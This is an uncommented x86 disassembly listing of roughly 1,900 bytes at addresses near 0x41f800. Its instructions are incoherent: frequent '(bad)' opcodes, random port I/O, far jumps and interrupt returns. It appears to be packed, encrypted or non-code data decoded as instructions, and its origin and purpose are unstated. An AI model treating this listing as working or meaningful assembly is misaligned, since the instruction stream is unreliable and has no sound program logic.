  41f7ab:	mov    edi,0xd3eeb2be
  41f7b0:	push   cs
  41f7b1:	add    DWORD PTR [eax*2-0x604d99f1],esp
  41f7b8:	pop    ecx
  41f7b9:	cmp    BYTE PTR [ecx],0xa8
  41f7bc:	fisttp WORD PTR [ebp+0x6]
  41f7bf:	and    BYTE PTR [edx],dh
  41f7c1:	adc    eax,0x3286e0de
  41f7c6:	inc    ecx
  41f7c7:	test   BYTE PTR [esp+edx*4+0x3f04c0ec],cl
  41f7ce:	xor    dh,dl
  41f7d0:	dec    edi
  41f7d1:	mov    dh,0x26
  41f7d3:	inc    edx
  41f7d4:	mov    al,ds:0xa0d4090e
  41f7d9:	ret    0x1b4c
  41f7dc:	imul   ebp,DWORD PTR [esi],0x8591cb1e
  41f7e2:	xor    eax,DWORD PTR [ebp-0x44]
  41f7e5:	mov    DWORD PTR [esi+0x37],edi
  41f7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e9:	fadd   DWORD PTR [edx]
  41f7eb:	arpl   WORD PTR [eax-0x2c],si
  41f7ee:	out    0x98,al
  41f7f0:	pop    ecx
  41f7f1:	inc    ebx
  41f7f2:	loop   0x41f7af
  41f7f4:	inc    esp
  41f7f5:	scas   al,BYTE PTR es:[edi]
  41f7f6:	push   ss
  41f7f7:	ins    BYTE PTR es:[edi],dx
  41f7f8:	clc    
  41f7f9:	adc    BYTE PTR [edx+0x6cfa2799],bl
  41f7ff:	and    BYTE PTR [esi],ah
  41f801:	cmp    BYTE PTR [ecx],al
  41f803:	out    dx,al
  41f804:	xchg   ebp,eax
  41f805:	cs data16 cmp al,0xf2
  41f809:	jmp    0x1abf:0x7eab6c98
  41f810:	mov    eax,0x189caafe
  41f815:	add    eax,DWORD PTR [esp+eiz*2]
  41f818:	jmp    FWORD PTR [esp+edi*2+0x31]
  41f81c:	pop    ds
  41f81d:	cs pop ds
  41f81f:	daa    
  41f820:	xor    dl,BYTE PTR [esi-0x73]
  41f823:	adc    esi,esp
  41f825:	rcl    esi,0x4e
  41f828:	fs dec eax
  41f82a:	pop    esi
  41f82b:	fistp  QWORD PTR [esi-0x40]
  41f82e:	and    bl,cl
  41f830:	(bad)
  41f834:	push   edx
  41f835:	popf   
  41f836:	outs   dx,BYTE PTR ds:[esi]
  41f837:	push   cs
  41f838:	(bad)  
  41f83a:	push   eax
  41f83b:	je     0x41f8ac
  41f83d:	(bad)  
  41f83f:	fist   DWORD PTR [ecx+0x6ab42fb2]
  41f845:	test   DWORD PTR [edx+0x14a8cfe1],ecx
  41f84b:	push   edx
  41f84c:	fcmove st,st(2)
  41f84e:	sub    ah,BYTE PTR [ebx+edx*1-0x6d]
  41f852:	call   0x26df:0xb2cba7c5
  41f859:	retf   
  41f85a:	shl    ch,0xc7
  41f85d:	xchg   edi,eax
  41f85e:	scas   al,BYTE PTR es:[edi]
  41f85f:	scas   al,BYTE PTR es:[edi]
  41f860:	scas   eax,DWORD PTR es:[edi]
  41f861:	(bad)  
  41f862:	xor    DWORD PTR [esi-0x6199724c],ecx
  41f868:	fdivr  st,st(5)
  41f86a:	xchg   edx,eax
  41f86b:	mov    ebp,?
  41f86d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9c
  41f871:	mov    BYTE PTR [ebx],dh
  41f873:	and    DWORD PTR [edi-0x28bd0f5c],ebx
  41f879:	je     0x41f806
  41f87b:	js     0x41f8bc
  41f87d:	out    0x73,al
  41f87f:	mov    dh,0x52
  41f881:	cmp    BYTE PTR [edi+0x3d],cl
  41f884:	sub    ecx,eax
  41f886:	jmp    0x4dd7:0x492552fd
  41f88d:	cmp    DWORD PTR [ecx-0x127a62f9],0xffffffbc
  41f894:	cwde   
  41f895:	push   cs
  41f896:	stos   BYTE PTR es:[edi],al
  41f897:	jecxz  0x41f902
  41f899:	jmp    0xd77d7b92
  41f89e:	mov    edi,0x7e4bed9e
  41f8a3:	pop    ebx
  41f8a4:	lock push ebp
  41f8a6:	xor    DWORD PTR [ecx+0x35fb4c93],0x7c6c513
  41f8b0:	fld    DWORD PTR [esp+eiz*8-0x781409ea]
  41f8b7:	push   ebp
  41f8b8:	jnp    0x41f8b1
  41f8ba:	out    dx,al
  41f8bb:	in     al,0x16
  41f8bd:	push   0x4da0673b
  41f8c2:	iret   
  41f8c3:	les    eax,FWORD PTR [eax-0xd]
  41f8c6:	sub    edx,DWORD PTR [edi]
  41f8c8:	lea    edx,[edx+ebp*2]
  41f8cb:	into   
  41f8cc:	loop   0x41f86f
  41f8ce:	icebp  
  41f8cf:	loop   0x41f929
  41f8d1:	scas   eax,DWORD PTR es:[edi]
  41f8d2:	push   ds
  41f8d3:	mov    al,0xc9
  41f8d5:	and    DWORD PTR [esp+eiz*4-0x7379005],ecx
  41f8dc:	popf   
  41f8dd:	and    ebx,DWORD PTR [ebx+ebx*2]
  41f8e0:	mov    ds:0x7f8b44d5,eax
  41f8e5:	mov    eax,ds:0xca97feb1
  41f8ea:	arpl   WORD PTR cs:[eax+eiz*2+0x41a2c462],dx
  41f8f2:	lods   al,BYTE PTR ds:[esi]
  41f8f3:	scas   eax,DWORD PTR es:[edi]
  41f8f4:	cwde   
  41f8f5:	xor    eax,0xd20034bb
  41f8fa:	int    0x51
  41f8fc:	sbb    eax,0x26b772e
  41f901:	repz lea ebx,[edi+0x7ad71637]
  41f908:	cmp    eax,0xbdb85290
  41f90d:	cdq    
  41f90e:	mov    ds,ebx
  41f910:	jae    0x41f8f3
  41f912:	leave  
  41f913:	daa    
  41f914:	xor    al,BYTE PTR [ebp+0x66]
  41f917:	(bad)  
  41f919:	mov    edi,0x594dd5ec
  41f91e:	std    
  41f91f:	sbb    dl,bl
  41f921:	idiv   BYTE PTR [esi+0x4d]
  41f924:	clc    
  41f925:	aad    0xc
  41f927:	mov    ah,0x68
  41f929:	jp     0x41f959
  41f92b:	dec    esi
  41f92c:	das    
  41f92d:	mov    ebx,0x29c399d5
  41f932:	or     al,0xcd
  41f934:	icebp  
  41f935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f936:	ficomp DWORD PTR [eax+0x77c2128e]
  41f93c:	sahf   
  41f93d:	pop    edx
  41f93e:	xor    al,0x45
  41f940:	push   ss
  41f941:	sbb    ebp,DWORD PTR [ebx+ecx*1]
  41f944:	xchg   esp,eax
  41f945:	fmul   QWORD PTR [eax]
  41f947:	pushf  
  41f948:	sbb    BYTE PTR [esi+0x1edf4e06],bl
  41f94e:	gs retf 
  41f950:	pop    edx
  41f951:	mov    dh,0x5a
  41f953:	ja     0x41f9ac
  41f955:	out    0xd1,al
  41f957:	lock xchg esp,eax
  41f959:	fmul   QWORD PTR [eax]
  41f95b:	popa   
  41f95c:	leave  
  41f95d:	clc    
  41f95e:	retf   0xf32e
  41f961:	pop    esp
  41f962:	shl    DWORD PTR [ebx+0x68],cl
  41f965:	or     BYTE PTR [esi+0xd],0x61
  41f969:	rol    DWORD PTR [edx],cl
  41f96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96c:	ss push edi
  41f96e:	mov    ecx,0xd99bb4a6
  41f973:	call   0x1462:0x743701a5
  41f97a:	cmp    BYTE PTR [esp+esi*4-0x29],bh
  41f97e:	rcr    bl,0x2a
  41f981:	outs   dx,BYTE PTR ds:[esi]
  41f982:	fld    DWORD PTR [ebx]
  41f984:	or     BYTE PTR [edx+ebx*4],bl
  41f987:	dec    edx
  41f988:	push   ss
  41f989:	sub    al,0xa4
  41f98b:	push   ebp
  41f98c:	push   ecx
  41f98d:	or     ebp,DWORD PTR [edi]
  41f98f:	mov    DWORD PTR [edx],eax
  41f991:	mov    ebx,esp
  41f993:	xchg   edi,eax
  41f994:	aaa    
  41f995:	lock sub eax,0xdaa66d20
  41f99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f99c:	leave  
  41f99d:	frstor [eax+eiz*2]
  41f9a0:	mov    eax,edi
  41f9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9a3:	jmp    0x2e3c:0xb585b023
  41f9aa:	cld    
  41f9ab:	lock dec ebx
  41f9ad:	sar    BYTE PTR [ecx],cl
  41f9af:	clc    
  41f9b0:	xlat   BYTE PTR ds:[ebx]
  41f9b1:	fidiv  WORD PTR [ecx+0x7d]
  41f9b4:	cmp    dl,BYTE PTR [esi-0x59559cf1]
  41f9ba:	jae    0x41fa02
  41f9bc:	pop    ebx
  41f9bd:	pop    ecx
  41f9be:	repnz (bad) [eax]
  41f9c1:	jb     0x41fa27
  41f9c3:	(bad)  
  41f9c4:	in     eax,0x91
  41f9c6:	or     al,BYTE PTR [edi]
  41f9c8:	es call 0x300a:0x8ab20391
  41f9d0:	add    cl,0x2e
  41f9d3:	fs loopne 0x41f978
  41f9d6:	aaa    
  41f9d7:	ret    0x9dcf
  41f9da:	jne    0x41fa26
  41f9dc:	xchg   DWORD PTR [esi+ecx*8],esp
  41f9df:	loopne 0x41f98a
  41f9e1:	pop    ecx
  41f9e2:	hlt    
  41f9e3:	sub    BYTE PTR [ebp-0x5a],ah
  41f9e6:	lahf   
  41f9e7:	jge    0x41f9df
  41f9e9:	sub    al,0xb0
  41f9eb:	fwait
  41f9ec:	nop
  41f9ed:	fisub  DWORD PTR [ebp-0xb]
  41f9f0:	cli    
  41f9f1:	es jae 0x41fa38
  41f9f4:	jno    0x41fa48
  41f9f6:	or     al,0x32
  41f9f8:	pop    esp
  41f9f9:	sbb    BYTE PTR [esi-0x11a3454e],al
  41f9ff:	shl    BYTE PTR [eax],0xb6
  41fa02:	xchg   DWORD PTR [edx-0x121a6941],esp
  41fa08:	shr    esp,cl
  41fa0a:	jb     0x41f9fd
  41fa0c:	mov    bh,0xec
  41fa0e:	mov    WORD PTR [ebx+0x6609cb9d],fs
  41fa14:	ret    
  41fa15:	sub    BYTE PTR [eax+0x61],dh
  41fa18:	call   0x78ba6e28
  41fa1d:	pop    ds
  41fa1e:	mov    ecx,0xa1c54310
  41fa23:	xor    al,0x1b
  41fa25:	xchg   ebp,eax
  41fa26:	dec    edx
  41fa27:	cmc    
  41fa28:	sub    eax,DWORD PTR [ecx+0x48911c9e]
  41fa2e:	adc    edx,DWORD PTR [esi-0x55202af8]
  41fa34:	pop    eax
  41fa35:	lods   eax,DWORD PTR ds:[esi]
  41fa36:	rol    ch,cl
  41fa38:	in     eax,0x2b
  41fa3a:	dec    edi
  41fa3b:	push   ebp
  41fa3c:	lods   al,BYTE PTR ds:[esi]
  41fa3d:	repz scas eax,DWORD PTR es:[edi]
  41fa3f:	(bad)
  41fa43:	iret   
  41fa44:	add    dh,BYTE PTR [edx]
  41fa46:	ret    
  41fa47:	xlat   BYTE PTR ds:[ebx]
  41fa48:	push   eax
  41fa49:	mov    ebp,0x52c06fd7
  41fa4e:	iret   
  41fa4f:	imul   DWORD PTR [ecx-0x7f]
  41fa52:	push   ds
  41fa53:	ins    BYTE PTR es:[edi],dx
  41fa54:	popa   
  41fa55:	sub    eax,0x670f269
  41fa5a:	mov    eax,ds:0xbf38cd1d
  41fa5f:	mov    al,0x43
  41fa61:	call   0xf90984f8
  41fa66:	push   ds
  41fa67:	push   cs
  41fa68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa69:	int    0xcc
  41fa6b:	jle    0x41fa1f
  41fa6d:	test   eax,0x3c74f8ae
  41fa72:	xor    BYTE PTR [ebp+0x9bce022],ch
  41fa78:	push   esp
  41fa79:	fadd   QWORD PTR [edi-0x18eb2a47]
  41fa7f:	ds mov dh,0x7e
  41fa82:	sbb    al,0x5b
  41fa84:	frstor [esi-0x33]
  41fa87:	das    
  41fa88:	adc    BYTE PTR [esi+0x64],bh
  41fa8b:	xchg   ebx,eax
  41fa8c:	stos   BYTE PTR es:[edi],al
  41fa8d:	sub    DWORD PTR [eax-0x3f11d39c],esi
  41fa93:	lea    edi,[edi+0x74]
  41fa96:	xor    DWORD PTR [eax+eiz*2-0x17872c0f],edx
  41fa9d:	dec    esp
  41fa9e:	in     eax,dx
  41fa9f:	and    edi,esi
  41faa1:	xlat   BYTE PTR ds:[ebx]
  41faa2:	cld    
  41faa3:	ds test al,0x1f
  41faa6:	ins    BYTE PTR es:[edi],dx
  41faa7:	inc    ebx
  41faa8:	pop    eax
  41faa9:	pop    edi
  41faaa:	push   edx
  41faab:	sub    DWORD PTR [ecx-0x32a6864],ecx
  41fab1:	and    al,0xe3
  41fab3:	jae    0x41fa68
  41fab5:	pop    ebp
  41fab6:	mov    esp,0xe86575b1
  41fabb:	mov    cl,0xb2
  41fabd:	iret   
  41fabe:	aad    0xb1
  41fac0:	dec    esi
  41fac1:	(bad)  
  41fac2:	fisttp DWORD PTR [edi+0x12]
  41fac5:	xor    al,0x9e
  41fac7:	data16 mov ch,0x67
  41faca:	mov    ds,WORD PTR [eax]
  41facc:	mov    ah,BYTE PTR [esi]
  41face:	push   esp
  41facf:	dec    esp
  41fad0:	ins    BYTE PTR es:[edi],dx
  41fad1:	sbb    esi,DWORD PTR [ebx+0x4f]
  41fad4:	mov    dh,0xa
  41fad6:	add    eax,0xc9779515
  41fadb:	test   DWORD PTR [ebp-0x18900da6],0x964c7291
  41fae5:	lock and al,0x22
  41fae8:	gs aas 
  41faea:	in     eax,dx
  41faeb:	dec    ebx
  41faec:	cwde   
  41faed:	ret    0x101d
  41faf0:	mov    eax,ds:0xcb167abb
  41faf5:	hlt    
  41faf6:	int3   
  41faf7:	push   ecx
  41faf8:	jae    0x41fabe
  41fafa:	dec    esp
  41fafb:	push   0x60
  41fafd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fafe:	cs pusha 
  41fb00:	sbb    ebp,DWORD PTR [ebx+0x5758ca7d]
  41fb06:	mov    esp,0x901e2711
  41fb0b:	pop    esi
  41fb0c:	add    DWORD PTR [edx+ebp*4+0x38],0x902d7492
  41fb14:	dec    esi
  41fb15:	inc    edi
  41fb16:	mov    WORD PTR [edx],gs
  41fb18:	dec    ecx
  41fb19:	push   edx
  41fb1a:	lods   al,BYTE PTR ds:[esi]
  41fb1b:	jnp    0x41fb74
  41fb1d:	scas   eax,DWORD PTR es:[edi]
  41fb1e:	fcomip st,st(4)
  41fb20:	adc    BYTE PTR [ebx+ebx*1-0x64aa013f],al
  41fb27:	(bad)  
  41fb28:	(bad)  [eax-0x6e]
  41fb2b:	sti    
  41fb2c:	stc    
  41fb2d:	and    esp,esi
  41fb2f:	rcr    BYTE PTR ds:0xe8a9b008,cl
  41fb35:	test   al,0x15
  41fb37:	inc    ecx
  41fb38:	xchg   DWORD PTR [esi+0x26],ecx
  41fb3b:	adc    eax,0x9a482c22
  41fb40:	ds xchg ebp,eax
  41fb42:	call   0x360eaa92
  41fb47:	test   al,0xa8
  41fb49:	scas   eax,DWORD PTR es:[edi]
  41fb4a:	mov    al,ds:0x914fda8e
  41fb4f:	shr    DWORD PTR ds:[eax+0x6a],0xd0
  41fb54:	sahf   
  41fb55:	outs   dx,BYTE PTR ds:[esi]
  41fb56:	iret   
  41fb57:	mov    bh,0x38
  41fb59:	icebp  
  41fb5a:	inc    ecx
  41fb5b:	add    al,0xcf
  41fb5d:	je     0x41fb59
  41fb5f:	sub    ebx,DWORD PTR [edx+0x6f4b90a0]
  41fb65:	addr16 or eax,0x5548068b
  41fb6b:	sbb    eax,DWORD PTR ds:[ebp+0x2ea3b5af]
  41fb72:	add    esp,DWORD PTR ds:0x7e3af0a1
  41fb78:	cmc    
  41fb79:	stos   BYTE PTR es:[edi],al
  41fb7a:	xor    eax,0x16a062fe
  41fb7f:	clc    
  41fb80:	test   dh,dh
  41fb82:	and    ecx,esp
  41fb84:	mov    ebx,0x59eb5242
  41fb89:	iret   
  41fb8a:	mov    dh,0x85
  41fb8c:	mov    dh,0xbd
  41fb8e:	inc    ecx
  41fb8f:	mov    ds:0xd652fafb,eax
  41fb94:	cmp    esi,DWORD PTR [edx]
  41fb96:	(bad)  
  41fb97:	clc    
  41fb98:	and    dl,BYTE PTR [edi+0x5cd00f9d]
  41fb9e:	mov    fs,WORD PTR [ebx]
  41fba0:	jmp    0x41fb4d
  41fba2:	ret    0x3a16
  41fba5:	scas   al,BYTE PTR es:[edi]
  41fba6:	mov    esp,0x19f3bc3a
  41fbab:	cmp    eax,0xd6060e19
  41fbb0:	inc    esi
  41fbb1:	or     esi,DWORD PTR [ecx+edx*1-0x13]
  41fbb5:	pop    ss
  41fbb6:	push   0x3e
  41fbb8:	and    ecx,DWORD PTR [edx+0x2a]
  41fbbb:	push   0x278a6de7
  41fbc0:	jmp    0x41fb96
  41fbc2:	hlt    
  41fbc3:	sbb    bh,dh
  41fbc5:	jmp    DWORD PTR [ecx+0x52]
  41fbc8:	and    ebx,edx
  41fbca:	hlt    
  41fbcb:	mov    dh,0x88
  41fbcd:	in     eax,dx
  41fbce:	loopne 0x41fb65
  41fbd0:	mov    WORD PTR es:[ecx-0xa217c82],cs
  41fbd7:	and    cl,BYTE PTR [edi-0x19]
  41fbda:	pushf  
  41fbdb:	out    0x76,al
  41fbdd:	and    bh,al
  41fbdf:	out    0x4f,eax
  41fbe1:	or     ebx,DWORD PTR [edi-0x1219633f]
  41fbe7:	pop    edx
  41fbe8:	or     DWORD PTR [edx],ecx
  41fbea:	stos   BYTE PTR es:[edi],al
  41fbeb:	ret    0x4806
  41fbee:	test   al,dh
  41fbf0:	xor    al,BYTE PTR [edx-0x17]
  41fbf3:	jbe    0x41fbf7
  41fbf5:	sbb    ah,0x7a
  41fbf8:	test   al,0xc1
  41fbfa:	lock inc eax
  41fbfc:	out    dx,eax
  41fbfd:	xchg   DWORD PTR [ecx],edx
  41fbff:	dec    ebx
  41fc00:	and    bh,dl
  41fc02:	xchg   ecx,eax
  41fc03:	jmp    0xebb1d804
  41fc08:	add    eax,0xc6beea30
  41fc0d:	fcom   DWORD PTR [ebx]
  41fc0f:	out    0xe9,al
  41fc11:	cmp    ebx,esi
  41fc13:	or     ecx,DWORD PTR [edi+0xe]
  41fc16:	xor    cl,bh
  41fc18:	dec    eax
  41fc19:	(bad)  
  41fc1a:	rcl    DWORD PTR [ebx+ebp*4-0x64],cl
  41fc1e:	in     eax,dx
  41fc1f:	ror    DWORD PTR [ecx+0x4fc19410],cl
  41fc25:	push   edi
  41fc26:	add    eax,0x4d086e9
  41fc2b:	inc    esi
  41fc2c:	out    0x1b,al
  41fc2e:	push   edx
  41fc2f:	jns    0x41fbd9
  41fc31:	inc    ecx
  41fc32:	jns    0x41fbd7
  41fc34:	jge    0x41fc5d
  41fc36:	lock ret 0x7baa
  41fc3a:	mov    bl,0x41
  41fc3c:	neg    DWORD PTR [esi-0x62b3f693]
  41fc42:	dec    ebx
  41fc43:	ret    0xabed
  41fc46:	xchg   ebp,eax
  41fc47:	jbe    0x41fc8f
  41fc49:	bound  edi,QWORD PTR [eax]
  41fc4b:	repnz aas 
  41fc4d:	rol    DWORD PTR [edi+0x20350757],1
  41fc53:	mov    dl,BYTE PTR [eax]
  41fc55:	(bad)  
  41fc56:	andnps xmm7,xmm2
  41fc59:	mov    ss,eax
  41fc5b:	je     0x41fc0d
  41fc5d:	or     eax,0xe6ba28a9
  41fc62:	pop    edx
  41fc63:	xchg   ebp,eax
  41fc64:	xchg   ecx,eax
  41fc65:	or     eax,DWORD PTR [eax+ebp*1]
  41fc68:	div    dh
  41fc6a:	lock loopne 0x41fca5
  41fc6d:	adc    dh,BYTE PTR [edi+0x71]
  41fc70:	cmp    al,0x12
  41fc72:	pop    ss
  41fc73:	jge    0x41fc57
  41fc75:	xchg   edi,eax
  41fc76:	mul    edi
  41fc78:	dec    ebp
  41fc79:	sbb    eax,0x7b1ada93
  41fc7e:	int3   
  41fc7f:	pop    ss
  41fc80:	and    bl,BYTE PTR [ebx-0x74]
  41fc83:	inc    ebp
  41fc84:	fisubr WORD PTR [esi]
  41fc86:	mov    ch,0x55
  41fc88:	sub    bh,dl
  41fc8a:	enter  0xc861,0xbc
  41fc8e:	out    dx,al
  41fc8f:	inc    esp
  41fc90:	mov    ebp,0x15db4893
  41fc95:	rol    DWORD PTR [ebx],1
  41fc97:	(bad)  
  41fc98:	cdq    
  41fc99:	outs   dx,DWORD PTR ds:[esi]
  41fc9a:	fstp   QWORD PTR [esi+0x57]
  41fc9d:	in     al,0xfc
  41fc9f:	and    dh,BYTE PTR [eax+eax*8-0x4a]
  41fca3:	enter  0xd92e,0x3a
  41fca7:	stc    
  41fca8:	(bad)  
  41fca9:	imul   ebp,DWORD PTR [edx],0xffffff9f
  41fcac:	ror    BYTE PTR [ebp-0x2d343a71],1
  41fcb2:	imul   ebp,DWORD PTR [edi+0x7a285ec5],0x5b270c1e
  41fcbc:	inc    edi
  41fcbd:	nop
  41fcbe:	std    
  41fcbf:	inc    ebx
  41fcc0:	shl    BYTE PTR [esi+esi*8-0x12d0d04b],1
  41fcc7:	mov    esi,0x4d38156f
  41fccc:	sbb    BYTE PTR [bx+si-0x2819],dl
  41fcd1:	sub    ecx,DWORD PTR [eax-0x328abbc6]
  41fcd7:	out    dx,eax
  41fcd8:	cmp    ecx,DWORD PTR [bx+si-0x9c]
  41fcdd:	and    eax,0x3e3131a2
  41fce2:	arpl   WORD PTR [ebx-0x1d],dx
  41fce5:	xchg   edx,eax
  41fce6:	arpl   bp,cx
  41fce8:	xchg   esp,eax
  41fce9:	mov    ebp,0xa3003f69
  41fcee:	retf   0xfaf4
  41fcf1:	mov    dx,0x3470
  41fcf5:	or     BYTE PTR [edi+0x2bb059f7],bl
  41fcfb:	add    DWORD PTR [eax+0x11],ebx
  41fcfe:	ins    BYTE PTR es:[edi],dx
  41fcff:	nop
  41fd00:	xchg   esp,eax
  41fd01:	cdq    
  41fd02:	mov    al,ds:0x9d3bf6d1
  41fd07:	daa    
  41fd08:	mov    dl,0xb3
  41fd0a:	das    
  41fd0b:	push   ecx
  41fd0c:	cwde   
  41fd0d:	div    BYTE PTR [eax+esi*8]
  41fd10:	xchg   cl,dh
  41fd12:	mov    edi,0x679b986
  41fd17:	and    edi,edi
  41fd19:	arpl   cx,cx
  41fd1b:	inc    ebp
  41fd1c:	or     al,0x6c
  41fd1e:	test   eax,0x2c59ad23
  41fd23:	jmp    0xe03d4d14
  41fd28:	jl     0x41fd6b
  41fd2a:	xchg   ecx,eax
  41fd2b:	test   al,0xaa
  41fd2d:	test   DWORD PTR [edi-0x57],eax
  41fd30:	ror    ebx,cl
  41fd32:	push   0x72
  41fd34:	cmp    al,0x19
  41fd36:	pop    DWORD PTR [esi+0x36]
  41fd39:	lods   eax,DWORD PTR ds:[esi]
  41fd3a:	cmp    al,BYTE PTR [ebp-0x5b]
  41fd3d:	xchg   esp,eax
  41fd3e:	push   ss
  41fd3f:	pop    eax
  41fd40:	push   ebx
  41fd41:	aam    0x87
  41fd43:	lea    esi,[ebp+eax*8-0x36333ea5]
  41fd4a:	hlt    
  41fd4b:	clc    
  41fd4c:	(bad)  
  41fd4e:	sub    ebx,eax
  41fd50:	cmp    DWORD PTR [eax],edi
  41fd52:	and    BYTE PTR [eiz*2+0x3a67bd11],cl
  41fd59:	pop    ecx
  41fd5a:	sbb    BYTE PTR [ebp-0x44d9ce74],0x76
  41fd61:	(bad)  
  41fd62:	xor    bh,dh
  41fd64:	jmp    FWORD PTR ds:0x12f95ef1
  41fd6a:	scas   eax,DWORD PTR es:[edi]
  41fd6b:	mov    eax,ds:0xb9805360
  41fd70:	push   edx
  41fd71:	xchg   ecx,eax
  41fd72:	pop    ebx
  41fd73:	mov    ds:0xe572e241,eax
  41fd78:	jae    0x41fdd6
  41fd7a:	das    
  41fd7b:	jp     0x41fd56
  41fd7d:	out    0x6c,eax
  41fd7f:	inc    ebx
  41fd80:	sahf   
  41fd81:	fldenv [esi]
  41fd83:	das    
  41fd84:	push   es
  41fd85:	jmp    0xbc7c5f2f
  41fd8a:	retf   0x111a
  41fd8d:	sbb    eax,0x6e7d1592
  41fd92:	test   eax,0x8d7fe661
  41fd97:	cs dec ebx
  41fd99:	retf   
  41fd9a:	fnstcw WORD PTR [edi]
  41fd9c:	dec    edi
  41fd9d:	imul   esp,ecx,0xffffffb2
  41fda0:	jmp    0x6abdce73
  41fda5:	mov    dl,0x19
  41fda7:	push   ecx
  41fda8:	sub    BYTE PTR [esi],ah
  41fdaa:	inc    edi
  41fdab:	(bad)  
  41fdad:	imul   esi,DWORD PTR [ecx],0x40e7d5fc
  41fdb3:	inc    edx
  41fdb4:	mov    ds:0x86a43169,eax
  41fdb9:	pop    ds
  41fdba:	dec    edi
  41fdbb:	sbb    eax,0x89e3111f
  41fdc0:	xchg   ebp,eax
  41fdc1:	fstp   QWORD PTR [edx-0x59ce6c05]
  41fdc7:	pop    ss
  41fdc8:	retf   
  41fdc9:	(bad)  
  41fdca:	loop   0x41fe4a
  41fdcc:	add    edx,DWORD PTR [edx+0x9f450cb]
  41fdd2:	dec    ebp
  41fdd3:	in     al,0x9e
  41fdd5:	lods   eax,DWORD PTR ds:[esi]
  41fdd6:	inc    ecx
  41fdd8:	sub    BYTE PTR [edx],dl
  41fdda:	adc    ch,bh
  41fddc:	cli    
  41fddd:	jne    0x41fd92
  41fddf:	idiv   DWORD PTR gs:[ecx+edx*2-0x35]
  41fde4:	ins    DWORD PTR es:[edi],dx
  41fde5:	iret   
  41fde6:	jmp    0x1126:0x1ebc9926
  41fded:	sbb    bh,al
  41fdef:	lods   al,BYTE PTR ds:[esi]
  41fdf0:	dec    esi
  41fdf1:	test   al,0x4d
  41fdf3:	adc    al,BYTE PTR [ecx+0x64]
  41fdf6:	lock mov DWORD PTR [ecx-0x57],ecx
  41fdfa:	sahf   
  41fdfb:	or     ch,cl
  41fdfd:	sub    dl,al
  41fdff:	addr16 inc edx
  41fe01:	out    0x9c,al
  41fe03:	add    edx,DWORD PTR [edi]
  41fe05:	mov    bh,0xd5
  41fe07:	push   cs
  41fe08:	jae    0x41fe76
  41fe0a:	outs   dx,BYTE PTR ds:[esi]
  41fe0b:	inc    edi
  41fe0c:	sbb    al,0x20
  41fe0e:	cmp    DWORD PTR [esi-0x1],ebp
  41fe11:	test   eax,0x3ca119e8
  41fe16:	inc    esp
  41fe17:	xor    al,0x28
  41fe19:	inc    edx
  41fe1a:	push   0xffffffa7
  41fe1c:	mov    dl,0xb2
  41fe1e:	pop    ebx
  41fe1f:	pop    ds
  41fe20:	mov    esi,0x5fa10bd9
  41fe25:	ja     0x41fe2a
  41fe27:	call   0xcb78:0xdeb099b
  41fe2e:	ja     0x41fe01
  41fe30:	sbb    BYTE PTR [edx],ah
  41fe32:	loopne 0x41fe00
  41fe34:	ins    DWORD PTR es:[edi],dx
  41fe35:	outs   dx,DWORD PTR ds:[esi]
  41fe36:	popa   
  41fe37:	daa    
  41fe38:	jmp    0x5841:0xae0a8c1b
  41fe3f:	or     al,0xd2
  41fe41:	fstp   QWORD PTR [ecx+eax*8-0x76]
  41fe45:	fcomp  DWORD PTR [eax+0x63074a5d]
  41fe4b:	or     BYTE PTR [ecx+0x4b],0xcb
  41fe4f:	cdq    
  41fe50:	pop    ecx
  41fe51:	sub    eax,0x6a32abe7
  41fe56:	or     eax,0x46a8c628
  41fe5b:	retf   
  41fe5c:	(bad)  
  41fe5d:	out    0x91,eax
  41fe5f:	fwait
  41fe60:	ss jecxz 0x41fe6b
  41fe63:	mov    eax,ds:0xfac5bda
  41fe68:	fsubr  DWORD PTR [esp+eiz*2+0x4e]
  41fe6c:	adc    bh,BYTE PTR [edx+eax*8-0x32]
  41fe70:	repnz add eax,0x3904c244
  41fe76:	push   esp
  41fe77:	pop    ss
  41fe78:	adc    al,0x9b
  41fe7a:	lock xchg ebx,edi
  41fe7d:	fisttp DWORD PTR [ebp-0x2c23d42]
  41fe83:	xlat   BYTE PTR ds:[ebx]
  41fe84:	inc    edi
  41fe85:	jecxz  0x41fe95
  41fe87:	jo     0x41fea4
  41fe89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe8a:	pop    ds
  41fe8b:	cmp    DWORD PTR [eax+0x173a5ce7],edx
  41fe91:	cmp    eax,0x1f264632
  41fe96:	add    ch,BYTE PTR ds:0xe59f132
  41fe9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe9d:	and    DWORD PTR [eax-0x56700b94],ecx
  41fea3:	adc    ebx,ebp
  41fea5:	mul    DWORD PTR [ebx-0xb]
  41fea8:	imul   eax,esp,0xa
  41feab:	inc    esp
  41feac:	mov    ebp,0xeadbb990
  41feb1:	jmp    0x3e7d:0x8f706d73
  41feb8:	adc    ebx,DWORD PTR [ebx]
  41feba:	sub    DWORD PTR [ebx-0x2a07c8a7],ebx
  41fec0:	lods   al,BYTE PTR ds:[esi]
  41fec1:	cmp    ebx,edi
  41fec3:	scas   eax,DWORD PTR es:[edi]
  41fec4:	xor    BYTE PTR [ecx+0x54],ah
  41fec7:	xlat   BYTE PTR ds:[ebx]
  41fec8:	push   es
  41fec9:	cs xchg edi,eax
  41fecb:	mov    DWORD PTR [edi+0x7e],esi
  41fece:	and    BYTE PTR [ecx+0x6d2e8d51],dh
  41fed4:	leave  
  41fed5:	stc    
  41fed6:	(bad)  
  41fed7:	pop    eax
  41fed8:	ret    0xd9a2
  41fedb:	mov    edx,0xbe7db03
  41fee0:	push   cs
  41fee1:	sti    
  41fee2:	iret   
  41fee3:	or     al,0x53
  41fee5:	xor    BYTE PTR [edi-0x51a21caf],bh
  41feeb:	arpl   WORD PTR [ebx],ax
  41feed:	fild   DWORD PTR [edi+0x44]
  41fef0:	retf   0x5470
  41fef3:	xchg   ebx,eax
  41fef4:	mov    ecx,0xae09a29a
  41fef9:	jno    0x41ff4c
  41fefb:	mov    esp,0xda3db73d
